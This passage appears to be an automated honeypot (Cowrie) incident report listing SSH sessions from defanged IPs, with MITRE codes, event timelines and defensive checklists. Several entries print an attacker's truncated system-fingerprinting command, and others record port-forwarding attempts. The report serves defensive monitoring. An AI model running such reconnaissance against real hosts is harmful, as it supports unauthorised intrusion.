| `2026-08-29 13:49:56` | `cowrie.client.kex` |
| `2026-08-29 13:49:58` | `cowrie.login.success` |
| `2026-08-29 13:49:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:50:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:50:00` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c8023d047b8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:51 |
| **Last Seen** | 2026-08-29 13:51 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:51:25` | `cowrie.session.connect` |
| `2026-08-29 13:51:27` | `cowrie.client.version` |
| `2026-08-29 13:51:27` | `cowrie.client.kex` |
| `2026-08-29 13:51:33` | `cowrie.login.success` |
| `2026-08-29 13:51:37` | `cowrie.session.params` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.success` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:37` | `cowrie.command.input` |
| `2026-08-29 13:51:39` | `cowrie.log.closed` |
| `2026-08-29 13:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d744f179c81

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:53 |
| **Last Seen** | 2026-08-29 13:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:53:09` | `cowrie.session.connect` |
| `2026-08-29 13:53:10` | `cowrie.client.version` |
| `2026-08-29 13:53:10` | `cowrie.client.kex` |
| `2026-08-29 13:53:15` | `cowrie.login.success` |
| `2026-08-29 13:53:19` | `cowrie.session.params` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.success` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:19` | `cowrie.command.input` |
| `2026-08-29 13:53:21` | `cowrie.log.closed` |
| `2026-08-29 13:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24604c3407c9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:54 |
| **Last Seen** | 2026-08-29 13:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:54:47` | `cowrie.session.connect` |
| `2026-08-29 13:54:48` | `cowrie.client.version` |
| `2026-08-29 13:54:48` | `cowrie.client.kex` |
| `2026-08-29 13:54:55` | `cowrie.login.success` |
| `2026-08-29 13:54:58` | `cowrie.session.params` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.success` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:58` | `cowrie.command.input` |
| `2026-08-29 13:54:59` | `cowrie.log.closed` |
| `2026-08-29 13:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef2029cec54

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:56 |
| **Last Seen** | 2026-08-29 13:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:56:31` | `cowrie.session.connect` |
| `2026-08-29 13:56:32` | `cowrie.client.version` |
| `2026-08-29 13:56:32` | `cowrie.client.kex` |
| `2026-08-29 13:56:37` | `cowrie.login.success` |
| `2026-08-29 13:56:40` | `cowrie.session.params` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.success` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:40` | `cowrie.command.input` |
| `2026-08-29 13:56:41` | `cowrie.log.closed` |
| `2026-08-29 13:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5c27f7cd47

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:58 |
| **Last Seen** | 2026-08-29 13:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:58:06` | `cowrie.session.connect` |
| `2026-08-29 13:58:07` | `cowrie.client.version` |
| `2026-08-29 13:58:07` | `cowrie.client.kex` |
| `2026-08-29 13:58:12` | `cowrie.login.success` |
| `2026-08-29 13:58:16` | `cowrie.session.params` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.success` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:16` | `cowrie.command.input` |
| `2026-08-29 13:58:17` | `cowrie.log.closed` |
| `2026-08-29 13:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a10a400815

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:59 |
| **Last Seen** | 2026-08-29 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:59:24` | `cowrie.session.connect` |
| `2026-08-29 13:59:24` | `cowrie.client.version` |
| `2026-08-29 13:59:24` | `cowrie.client.kex` |
| `2026-08-29 13:59:25` | `cowrie.login.success` |
| `2026-08-29 13:59:25` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:59:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:59:26` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c80d5cbe22

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:59 |
| **Last Seen** | 2026-08-29 14:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:59:50` | `cowrie.session.connect` |
| `2026-08-29 13:59:52` | `cowrie.client.version` |
| `2026-08-29 13:59:52` | `cowrie.client.kex` |
| `2026-08-29 13:59:57` | `cowrie.login.success` |
| `2026-08-29 14:00:00` | `cowrie.session.params` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.success` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:00` | `cowrie.command.input` |
| `2026-08-29 14:00:02` | `cowrie.log.closed` |
| `2026-08-29 14:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f899090b70a9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:00 |
| **Last Seen** | 2026-08-29 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:00:55` | `cowrie.session.connect` |
| `2026-08-29 14:00:55` | `cowrie.client.version` |
| `2026-08-29 14:00:55` | `cowrie.client.kex` |
| `2026-08-29 14:00:56` | `cowrie.login.success` |
| `2026-08-29 14:00:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:00:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:00:57` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f54b1a3d9fb6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:01 |
| **Last Seen** | 2026-08-29 14:01 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:01:43` | `cowrie.session.connect` |
| `2026-08-29 14:01:44` | `cowrie.client.version` |
| `2026-08-29 14:01:44` | `cowrie.client.kex` |
| `2026-08-29 14:01:50` | `cowrie.login.success` |
| `2026-08-29 14:01:54` | `cowrie.session.params` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.success` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:54` | `cowrie.command.input` |
| `2026-08-29 14:01:55` | `cowrie.log.closed` |
| `2026-08-29 14:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1805356e4107

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-08-29 14:02 |
| **Last Seen** | 2026-08-29 14:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:02:14` | `cowrie.session.connect` |
| `2026-08-29 14:02:15` | `cowrie.client.version` |
| `2026-08-29 14:02:15` | `cowrie.client.kex` |
| `2026-08-29 14:02:17` | `cowrie.login.success` |
| `2026-08-29 14:02:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fa829f82fa

| Field | Detail |
|---|---|
| **Source IP** | `62.221.107[.]99` |
| **First Seen** | 2026-08-29 14:02 |
| **Last Seen** | 2026-08-29 14:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:02:23` | `cowrie.session.connect` |
| `2026-08-29 14:02:23` | `cowrie.client.version` |
| `2026-08-29 14:02:23` | `cowrie.client.kex` |
| `2026-08-29 14:02:25` | `cowrie.login.success` |
| `2026-08-29 14:02:25` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.221.107[.]99` to AbuseIPDB if not already reported
- [ ] Block `62.221.107[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43744164c7de

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:03 |
| **Last Seen** | 2026-08-29 14:03 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:03:36` | `cowrie.session.connect` |
| `2026-08-29 14:03:37` | `cowrie.client.version` |
| `2026-08-29 14:03:37` | `cowrie.client.kex` |
| `2026-08-29 14:03:44` | `cowrie.login.success` |
| `2026-08-29 14:03:47` | `cowrie.session.params` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.success` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:47` | `cowrie.command.input` |
| `2026-08-29 14:03:49` | `cowrie.log.closed` |
| `2026-08-29 14:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71eae4acc85

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-29 14:05 |
| **Last Seen** | 2026-08-29 14:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:05:02` | `cowrie.session.connect` |
| `2026-08-29 14:05:03` | `cowrie.client.version` |
| `2026-08-29 14:05:03` | `cowrie.client.kex` |
| `2026-08-29 14:05:04` | `cowrie.login.success` |
| `2026-08-29 14:05:05` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b581be974fd9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:05 |
| **Last Seen** | 2026-08-29 14:05 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:05:26` | `cowrie.session.connect` |
| `2026-08-29 14:05:27` | `cowrie.client.version` |
| `2026-08-29 14:05:27` | `cowrie.client.kex` |
| `2026-08-29 14:05:33` | `cowrie.login.success` |
| `2026-08-29 14:05:36` | `cowrie.session.params` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.success` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:36` | `cowrie.command.input` |
| `2026-08-29 14:05:37` | `cowrie.log.closed` |
| `2026-08-29 14:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809b5f4bbd5a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 14:07 |
| **Last Seen** | 2026-08-29 14:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
